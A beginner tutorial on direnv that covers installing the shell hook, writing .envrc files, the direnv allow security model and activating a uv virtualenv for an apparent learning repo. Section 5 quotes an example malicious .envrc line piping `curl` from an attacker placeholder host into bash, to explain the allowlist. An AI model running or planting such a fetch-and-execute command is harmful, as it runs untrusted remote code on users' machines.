# Direnv Basics

**Audience:** anyone who can open a terminal — no prior direnv experience · **Read time:** ~15 min

---

Every project has its own environment variables, its own PATH tweaks, its own
virtual environment. Without a tool to manage this, you end up with one of two
habits: either you paste `export` lines into every new terminal, or you dump
everything into your shell profile and hope nothing collides. Both habits break
eventually.

direnv solves this. It watches which directory you are in and automatically loads
the right environment when you enter a project, then unloads it when you leave.
In the Akanga learning path, direnv ensures that `AKANGA_SRC`, your Python
virtualenv, and any other project-specific settings are always active when you
are working in the repo — and gone when you are not.

---

## 1. What direnv is

direnv is a shell extension that automatically loads and unloads environment
variables based on the current directory. When you `cd` into a directory that
contains a `.envrc` file, direnv evaluates it and injects the resulting
environment into your shell. When you `cd` out, it removes those changes.

What direnv is **not**:

- **Not a package manager.** It does not install anything.
- **Not a virtualenv tool.** It does not create virtualenvs on its own (though
  it can trigger their creation).
- **Not a secrets manager.** It can load secrets from a file, but it has no
  encryption, vault integration, or rotation features.

direnv is an environment configurator. Its only job is to make your shell reflect
the project you are currently working in.

---

## 2. How it works

direnv installs a tiny hook into your shell. Every time your prompt renders (which
happens after every command, including `cd`), the hook checks whether the current
directory — or any parent directory — contains a `.envrc` file.

If it finds one:

1. It checks whether you have previously approved that exact file (more on this
   in section 5).
2. If approved, it spawns a bash subshell, sources the `.envrc`, captures the
   resulting environment, and diffs it against your current environment.
3. It applies the diff — new variables are set, changed variables are updated,
   removed variables are unset.

If you leave the directory, direnv reverses the diff, restoring your shell to its
previous state.

The mental model: **your terminal remembers project-specific settings
automatically.** You never have to source anything, export anything, or remember
which project needs which variables. You just `cd` in and start working.

---

## 3. Installing direnv

### macOS (Homebrew)

```shell
brew install direnv
```

### Linux

Most package managers carry direnv:

```shell
# Debian / Ubuntu
sudo apt install direnv

# Fedora
sudo dnf install direnv

# Arch
sudo pacman -S direnv
```

### The shell hook

Installing the binary is not enough. You must also add the direnv hook to your
shell configuration file so it runs on every prompt. Add **one** of the following
lines to the end of the indicated file:

**zsh** (`~/.zshrc`):

```shell
eval "$(direnv hook zsh)"
```

**bash** (`~/.bashrc`):

```shell
eval "$(direnv hook bash)"
```

**fish** (`~/.config/fish/config.fish`):

```shell
direnv hook fish | source
```

After adding the line, restart your shell or source the config file:

```shell
# zsh
source ~/.zshrc

# bash
source ~/.bashrc
```

You only do this once. From now on, direnv is active in every terminal session.

---

## 4. The .envrc file

The `.envrc` is a bash script that lives in a project directory. When direnv loads
it, it runs the script in a bash subshell and captures any environment changes.

A simple example:

```shell
# .envrc
export PROJECT_NAME="akanga"
export DEBUG=1
```

When you `cd` into this directory, direnv sets `PROJECT_NAME` and `DEBUG`. When
you leave, both are unset.

### It is a real bash script

`.envrc` is not a flat key-value file. It is actual bash, which means you can use
conditionals, loops, command substitution, and any other shell construct:

```shell
# .envrc
export GIT_BRANCH=$(git rev-parse --abbrev-ref HEAD)

if [ -f .env.local ]; then
    source .env.local
fi
```

### direnv stdlib functions

direnv provides a set of built-in functions (its "stdlib") that you can call
inside `.envrc`. The most useful ones:

| Function | What it does |
|---|---|
| `PATH_add <dir>` | Prepends `<dir>` to `$PATH` |
| `path_add <var> <dir>` | Prepends `<dir>` to any path-style variable |
| `source_env <file>` | Sources another `.envrc`-style file |
| `dotenv` | Loads a `.env` file (key=value format) |
| `layout python3` | Creates and activates a Python 3 virtualenv |

You can see the full list with `direnv stdlib` in your terminal.

---

## 5. The security model — `direnv allow`

Here is a scenario: you clone a repository from the internet. It contains an
`.envrc` that runs `curl http://evil.example | bash`. Without any safeguard,
direnv would execute that the moment you `cd` into the cloned directory.

direnv prevents this with an allowlist. It refuses to load any `.envrc` that you
have not explicitly approved. When you enter a directory with a new or modified
`.envrc`, you will see:

```
direnv: error /path/to/project/.envrc is blocked. Run `direnv allow` to approve its content
```

This is not a bug. This is the security model working correctly.

### The three commands

**`direnv allow`** — Approves the current `.envrc`. direnv computes a hash of the
file contents and stores it. As long as the file does not change, it will load
automatically.

```shell
direnv allow
```

**`direnv deny`** — Explicitly blocks the current `.envrc`. direnv will not load
it even if it was previously allowed.

```shell
direnv deny
```

**`direnv status`** — Shows the current state: which `.envrc` is loaded (if any),
whether it is allowed, and which shell hook is active.

```shell
direnv status
```

### When you edit .envrc

Every time you modify `.envrc`, its hash changes and direnv blocks it again. You
will see the "is blocked" message until you run `direnv allow` again. This is
intentional: it forces you to acknowledge the change before it takes effect.

---

## 6. Using direnv with uv

The Akanga learning path uses `uv` as its Python package manager. Out of the box,
`uv` manages virtualenvs and you run commands with `uv run python`, `uv run
pytest`, etc. This works, but it adds friction: you have to remember the `uv run`
prefix every time.

direnv can activate the virtualenv for you, so plain `python` and `pytest` just
work. Here is the `.envrc` pattern for a uv-managed project:

```shell
# .envrc — uv project with direnv

# Create the virtualenv if it doesn't exist yet
[ -d .venv ] || uv venv

# Activate it (direnv captures the env changes from activate)
source .venv/bin/activate

# Install/sync dependencies
uv sync

# Project-specific environment variables
export AKANGA_SRC=./src
```

What this gives you:

- **`python` works directly.** No `uv run` prefix needed. The virtualenv's
  `python` is on your PATH.
- **`pytest`, `ruff`, `mypy` work directly.** Any tool installed in the venv is
  available by name.
- **`AKANGA_SRC` is always set.** The Makefile and test suite read this variable
  to locate your code. With direnv, you never forget to set it.
- **Everything unloads when you leave.** `cd` to another project and the venv
  deactivates, `AKANGA_SRC` disappears, and your shell is clean.

### Why not just use `uv run`?

You absolutely can. `uv run pytest` and `make test PHASE=2` still work regardless
of direnv. But direnv removes the cognitive overhead of remembering which wrapper
to use. When the virtualenv is active, you can run ad-hoc Python commands, use
`ipython`, or invoke scripts without thinking about it.

---

## 7. Layout functions

direnv includes a built-in function called `layout python3` that creates and
activates a Python virtualenv automatically:

```shell
# .envrc — using the built-in layout
layout python3
```

This works well for projects that use pip or a standard `requirements.txt`.
However, for uv-managed projects like Akanga, the explicit approach from section 6
is preferred for two reasons:

1. **`layout python3` creates its own virtualenv** in a direnv-managed location,
   ignoring the `.venv` directory that `uv` expects. This means `uv sync` and
   `layout python3` disagree about where packages live.
2. **`uv venv` respects the Python version** pinned in `pyproject.toml`. The
   built-in layout may pick a different Python interpreter.

The rule of thumb: if your project uses `uv`, skip `layout python3` and use the
explicit `uv venv` + `source .venv/bin/activate` pattern instead.

---

## 8. The .envrc in the Akanga learning repo

When you set up the Akanga learning path, you will create (or find) an `.envrc`
in the repository root that looks like this:

```shell
# .envrc — Akanga Mirin learning path

# Ensure a virtualenv exists, create with uv if not
[ -d .venv ] || uv venv

# Activate the virtualenv so python/pytest/ruff are on PATH
source .venv/bin/activate

# Sync dependencies from pyproject.toml
uv sync

# Point test harness at the learner's code directory
export AKANGA_SRC=./src
```

Line by line:

- **`[ -d .venv ] || uv venv`** — The first time you enter the repo (or after
  deleting `.venv`), this creates a fresh virtualenv using the Python version
  specified in `pyproject.toml` (>=3.13).
- **`source .venv/bin/activate`** — Puts the venv's `python`, `pytest`, `ruff`,
  and every other installed tool onto your PATH.
- **`uv sync`** — Installs or updates all dependencies. This runs every time you
  enter the directory, but `uv sync` is fast (sub-second when nothing changed)
  so you will not notice it.
- **`export AKANGA_SRC=./src`** — The Makefile's `test` target reads this variable
  to know where your implementation lives. Without it, the Makefile prints a
  warning and defaults to `./src` anyway — but with direnv, the warning never
  appears.

### First-time setup

The complete first-time workflow is two commands:

```shell
cd akanga_mirin
direnv allow
```

If the project also has a `make setup` target, run that first:

```shell
cd akanga_mirin
make setup
direnv allow
```

After `direnv allow`, every subsequent `cd` into the repo activates everything
automatically. No manual steps, no sourcing, no prefixes.

---

## 9. Common pitfalls

**Forgetting the shell hook.** If you installed direnv but nothing happens when
you `cd` into a project, check whether the hook is in your shell config. Run
`direnv status` — if it says "No .envrc or .env file found" even when one exists
in the current directory, the hook is not installed. Revisit section 3.

**Forgetting `direnv allow` after editing .envrc.** Every edit to `.envrc`
invalidates the hash and blocks the file. The fix is always `direnv allow`. If
you see "is blocked" after making a change, this is why.

**Running `source .envrc` manually.** Do not do this. `source .envrc` runs the
file in your current shell without direnv's tracking. This means direnv cannot
unload the environment when you leave the directory. You end up with stale
variables that follow you everywhere. Always use `direnv allow` to (re)load
changes.

**`.envrc` containing secrets and committed to git.** The Akanga `.envrc` does
not contain secrets — it only sets paths and activates a virtualenv. But if you
add API keys or database passwords to `.envrc` in other projects, make sure the
file is listed in `.gitignore`. A good practice is to put secrets in a `.env`
file (which is typically gitignored) and use `dotenv` inside `.envrc` to load it:

```shell
# .envrc
dotenv          # loads .env if it exists
export AKANGA_SRC=./src
```

**Slow .envrc causing delays.** Because `.envrc` runs on every prompt that follows
a directory change, slow commands (network calls, large installs) create noticeable
lag. Keep `.envrc` fast. The `[ -d .venv ] || uv venv` guard ensures `uv venv`
only runs when the virtualenv is missing, not on every entry. Similarly, `uv sync`
is designed to be near-instant when nothing has changed.

**Nested .envrc files.** If a subdirectory has its own `.envrc`, direnv loads that
one instead of the parent's. If you need both, add `source_env ../.envrc` at the
top of the child `.envrc`. In the Akanga repo, a single root-level `.envrc` is
sufficient.

---

## 10. Next steps

- Run `direnv allow` in the akanga_mirin repo to activate the project environment.
- Verify with `direnv status` — you should see the `.envrc` path and "Allowed."
- Run `make help` to confirm the Makefile targets are available and `AKANGA_SRC`
  is set.
- Open a second terminal, `cd` into the repo, and confirm that the environment
  loads without any manual steps.
- For deeper reference: `direnv help`, `direnv stdlib`, or the official docs at
  `https://direnv.net`.
